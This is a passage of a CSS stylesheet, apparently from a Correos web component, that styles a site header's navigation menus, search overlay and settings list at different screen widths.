				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-title.sc-correos-cdk-core-header .cdk-nav-lv-title-icon.sc-correos-cdk-core-header {
					display: block
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header a.cdk-nav-lv-second-title.sc-correos-cdk-core-header:hover span.sc-correos-cdk-core-header {
				text-decoration: underline
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header {
				width: 100%
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header {
					min-width: 240px
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header .cdk-nav-lv-second-column.sc-correos-cdk-core-header {
				border-top: var(--_cdk-core-header-border-subpanel);
				width: auto
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header .cdk-nav-lv-second-column.sc-correos-cdk-core-header .cdk-nav-lv-third.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				padding-top: 0.75rem;
				padding-bottom: 0.75rem;
				font-weight: lighter
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header .cdk-nav-lv-second-column.sc-correos-cdk-core-header .cdk-nav-lv-third.sc-correos-cdk-core-header {
					padding-top: 0.75rem;
					padding-bottom: 0.75rem
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header .cdk-nav-lv-second-column.sc-correos-cdk-core-header .cdk-nav-lv-third.sc-correos-cdk-core-header a.sc-correos-cdk-core-header:hover {
				text-decoration: underline
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header .cdk-nav-lv-second-column.sc-correos-cdk-core-header .cdk-nav-lv-third.--title.sc-correos-cdk-core-header {
				font-weight: bold
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header .cdk-nav-lv-second-column.sc-correos-cdk-core-header .cdk-nav-lv-third.sc-correos-cdk-core-header .cdk-nav-lv-second-item-arrow.sc-correos-cdk-core-header {
				margin-left: auto
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header .cdk-nav-lv-second-column.sc-correos-cdk-core-header a.cdk-nav-lv-third.--title.sc-correos-cdk-core-header:hover span.sc-correos-cdk-core-header {
				text-decoration: underline
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .ps--active-y.sc-correos-cdk-core-header .cdk-nav-page.--lv-second.sc-correos-cdk-core-header {
				height: auto
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-content-click-outside.sc-correos-cdk-core-header {
				display: none;
				-ms-flex: 1 1 auto;
				flex: 1 1 auto
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-content-click-outside.sc-correos-cdk-core-header {
					display: block
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-overlay.sc-correos-cdk-core-header {
				position: absolute;
				opacity: 0;
				cursor: pointer;
				background-color: rgba(0, 0, 0, 0.4);
				top: 0;
				bottom: 0;
				left: 0;
				right: 0;
				width: 100%;
				height: 100%;
				display: none
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-overlay.sc-correos-cdk-core-header {
					-webkit-transition: opacity 0.15s linear;
					transition: opacity 0.15s linear;
					display: block
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings.sc-correos-cdk-core-header .cdk-nav-lv-first-button.sc-correos-cdk-core-header {
				width: 100%;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings.sc-correos-cdk-core-header .cdk-nav-lv-first-span.sc-correos-cdk-core-header {
				display: none
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings.sc-correos-cdk-core-header .cdk-nav-lv-first-div.sc-correos-cdk-core-header {
				height: 48px;
				-ms-flex-align: center;
				align-items: center;
				display: -ms-flexbox;
				display: flex
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings-list.sc-correos-cdk-core-header {
				display: none
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings-list.sc-correos-cdk-core-header {
					display: none
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings-list.sc-correos-cdk-core-header {
					display: none
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings-list.sc-correos-cdk-core-header .cdk-nav-lv-settings-li.sc-correos-cdk-core-header {
				-ms-flex-align: center;
				align-items: center;
				height: 48px;
				display: -ms-flexbox;
				display: flex
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings-list.sc-correos-cdk-core-header .cdk-nav-lv-settings-li.sc-correos-cdk-core-header .cdk-nav-lv-third.sc-correos-cdk-core-header {
				font-size: 0.875rem;
				line-height: 1.375rem;
				-ms-flex-align: center;
				align-items: center;
				display: -ms-flexbox;
				display: flex
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings-list.sc-correos-cdk-core-header .cdk-nav-lv-settings-li.sc-correos-cdk-core-header .cdk-nav-lv-third.sc-correos-cdk-core-header {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings-list.sc-correos-cdk-core-header .cdk-nav-lv-settings-li.sc-correos-cdk-core-header .cdk-nav-lv-third.sc-correos-cdk-core-header .cdk-nav-lv-settings-img.sc-correos-cdk-core-header {
				width: 24px;
				margin-left: 24px;
				margin-right: 16px
			}

			[variant=portalname].sc-correos-cdk-core-header-h .cdk-header-title--blue.sc-correos-cdk-core-header {
				color: var(--theme-color-blue)
			}

			[variant=portalname].sc-correos-cdk-core-header-h .cdk-nav-page.--lv-first.sc-correos-cdk-core-header {
				background-color: white
			}

			[variant=portalname].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header {
				height: var(--_height-large)
			}

			@media (min-width: 1024px) {
				[variant=portalname].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header {
					height: var(--_height-portalname)
				}
			}

			@media (min-width: 1024px) {
				[variant=portalname].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs--margin-top.sc-correos-cdk-core-header {
					margin-top: 28px
				}
			}

			@media (max-width: 639px) {
				[variant=portalname].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs--margin-top.sc-correos-cdk-core-header {
					margin-top: 10px
				}
			}

			[variant=portalname].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header {
				min-width: -webkit-max-content;
				min-width: -moz-max-content;
				min-width: max-content;
				width: -webkit-max-content;
				width: -moz-max-content;
				width: max-content
			}

			[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search.sc-correos-cdk-core-header {
				position: absolute;
				left: 0;
				right: 0;
				z-index: 16;
				background-color: white;
				top: var(--cdk-core-header-height-large);
				height: calc(100% - var(--cdk-core-header-height-large));
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column;
				border-top: 1px solid #cbcbcb
			}

			[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__close.sc-correos-cdk-core-header {
				width: 100%;
				display: -ms-flexbox;
				display: flex;
				place-content: flex-end;
				padding-top: 10px;
				padding-left: calc(0.7rem + var(--_cdk-core-header-wrapper-gutters));
				padding-right: calc(0.7rem +var(--_cdk-core-header-wrapper-gutters));
				height: 50px
			}

			@media (min-width: 1024px) {
				[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__close.sc-correos-cdk-core-header {
					padding-left: calc(1rem + var(--_cdk-core-header-wrapper-gutters));
					padding-right: calc(1rem +var(--_cdk-core-header-wrapper-gutters))
				}
			}

			[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__close.sc-correos-cdk-core-header i.sc-correos-cdk-core-header:hover {
				cursor: pointer
			}

			[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__content.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column;
				place-content: center;
				-ms-flex-item-align: center;
				align-self: center
			}

			[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__content.sc-correos-cdk-core-header .cdk-header-input-search.sc-correos-cdk-core-header {
				width: 100%;
				margin-bottom: 24px
			}

			[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__image.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-item-align: center;
				align-self: center;
				max-height: 283px;
				max-width: 364px
			}

			[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__image.sc-correos-cdk-core-header img.sc-correos-cdk-core-header {
				max-width: 100%;
				max-height: 100%
			}

			@media (max-width: 639px) {
				[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__image.sc-correos-cdk-core-header {
					max-height: 159px;
					max-width: 205px
				}
			}

			[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__description.sc-correos-cdk-core-header {
				font-size: 1.75rem;
				line-height: 2.625rem;
				margin: 24px 0;
				text-align: center;
				color: #002e6d
			}

			@media (min-width: 1024px) {
				[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__description.sc-correos-cdk-core-header {
					font-size: 2.5rem;
					line-height: 3.5rem
				}
			}

			[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search.sc-correos-cdk-core-header correos-ui-input.sc-correos-cdk-core-header {
				-ms-flex-item-align: center;
				align-self: center
			}

			@media (max-width: 639px) {
				[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search.sc-correos-cdk-core-header correos-ui-input.sc-correos-cdk-core-header {
					width: 314px
				}
			}

			@media (min-width: 1024px) {
				[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search.sc-correos-cdk-core-header {
					top: var(--cdk-core-header-height-portalname);
					height: calc(100% - var(--cdk-core-header-height-portalname))
				}
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header {
				padding-left: 32px
			}

			@media (min-width: 1024px) {
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header {
					display: none
				}
			}

			@media (min-width: 1024px) {
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .--moreThanSix.sc-correos-cdk-core-header {
					display: -ms-flexbox;
					display: flex
				}
			}

			@media (min-width: 1024px) {
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .--showDesktop.sc-correos-cdk-core-header {
					display: -ms-flexbox;
					display: flex
				}
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header {
				width: -webkit-max-content;
				width: -moz-max-content;
				width: max-content
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header img.sc-correos-cdk-core-header {
				width: 84px;
				height: 32px
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-links.sc-correos-cdk-core-header {
				display: none;
				-ms-flex-direction: row;
				flex-direction: row;
				-ms-flex-pack: center;
				justify-content: center;
				width: 100%
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-links.sc-correos-cdk-core-header .cdk-header-link.sc-correos-cdk-core-header {
				text-transform: uppercase;
				color: var(--_cdk-core-header-color-links);
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 16px
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-links.sc-correos-cdk-core-header .cdk-header-link.sc-correos-cdk-core-header::after {
				content: "";
				width: 40px;
				height: 1px;
				background-color: none;
				display: inline-block
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-links.sc-correos-cdk-core-header .cdk-header-link.sc-correos-cdk-core-header:last-child::after {
				width: 0px;
				height: 0px
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-title.sc-correos-cdk-core-header {
				display: none
			}

			@media (min-width: 1024px) {
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-title.sc-correos-cdk-core-header {
					display: -ms-flexbox;
					display: flex
				}
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-search-input-container.sc-correos-cdk-core-header {
				position: absolute;
				left: 0;
				right: 0
			}

			@media (max-width: 639px) {
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-search-input-container.sc-correos-cdk-core-header {
					top: 8px
				}
			}

			@media (min-width: 640px) {
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-search-input-container.sc-correos-cdk-core-header {
					top: 8px
				}
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .has-not-border.sc-correos-cdk-core-header {
				border-bottom: 0px
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .has-border.sc-correos-cdk-core-header {
				border-bottom: 1px solid var(--theme-color-softGrey)
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container.sc-correos-cdk-core-header {
				display: block;
				background-color: white;
				width: 100%;
				top: 8px
			}

			@media (min-width: 1024px) {
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container.sc-correos-cdk-core-header .cdk-header-input-search.sc-correos-cdk-core-header {
					width: 100%
				}
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container.sc-correos-cdk-core-header .cdk-header-close-button.sc-correos-cdk-core-header {
				display: inline-block;
				position: relative;
				width: 10%
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container.sc-correos-cdk-core-header .cdk-header-close-button.sc-correos-cdk-core-header .cdk-header-close-icon.sc-correos-cdk-core-header {
				margin: 0 auto;
				color: var(--_cdk-core-header-text-color)
			}

			@media (min-width: 1440px) {
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container.sc-correos-cdk-core-header .cdk-header-close-button.sc-correos-cdk-core-header .cdk-header-close-icon.sc-correos-cdk-core-header {
					margin-left: 35px
				}
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container--mobile-open.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex
			}

			@media (min-width: 1024px) {
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container--mobile-open.sc-correos-cdk-core-header {
					height: 80px
				}
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container--mobile-open.sc-correos-cdk-core-header .cdk-header-input-search.sc-correos-cdk-core-header {
				width: 90%;
				display: -ms-flexbox;
				display: flex;
				position: relative;
				border-right: 1px solid var(--theme-color-softGrey);
				-ms-flex-align: center;
				align-items: center;
				margin-bottom: 1px
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container--mobile-close.sc-correos-cdk-core-header {
				display: none
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-nav-page.--lv-first.sc-correos-cdk-core-header {
				background-color: white
			}

			@media (min-width: 1024px) {
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header {
					top: 80px
				}
			}

			@media (min-width: 1440px) {
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header {
					top: 88px
				}
			}

			@media (min-width: 1024px) {
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs--margin-top.sc-correos-cdk-core-header {
					margin-top: 28px
				}
			}

			@media (max-width: 639px) {
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs--margin-top.sc-correos-cdk-core-header {
					margin-top: 10px
				}
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header img.sc-correos-cdk-core-header {
				width: 17px;
				height: 7px
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header::after {
				right: -17px
			}

			@media (min-width: 640px) {
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header img.sc-correos-cdk-core-header {
					width: 84px;
					height: 32px
				}
			}

			@media (min-width: 1024px) {
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header {
					height: 80px
				}

				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header img.sc-correos-cdk-core-header {
					width: 106px;
					height: 40px
				}

				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header::after {
					height: 0px;
					width: 0px
				}

				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .--moreThanSix.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header::after {
					width: 1px;
					height: 33px;
					right: -16px
				}

				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-links.sc-correos-cdk-core-header {
					display: -ms-flexbox;
					display: flex
				}

				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-links.sc-correos-cdk-core-header .active.sc-correos-cdk-core-header {
					font-weight: bold;
					border-bottom: 1px solid var(--_cdk-core-header-color-links);
					padding-bottom: 7px
				}
			}

			@media (min-width: 1440px) {
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header {
					height: 88px
				}

				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header img.sc-correos-cdk-core-header {
					width: 127px;
					height: 47px
				}

				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header::after {
					height: 0px;
					width: 0px
				}

				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .--moreThanSix.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header::after {
					width: 1px;
					height: 33px;
					right: -16px
				}

				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-links.sc-correos-cdk-core-header {
					display: -ms-flexbox;
					display: flex
				}
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header {
				padding-bottom: 64px
			}

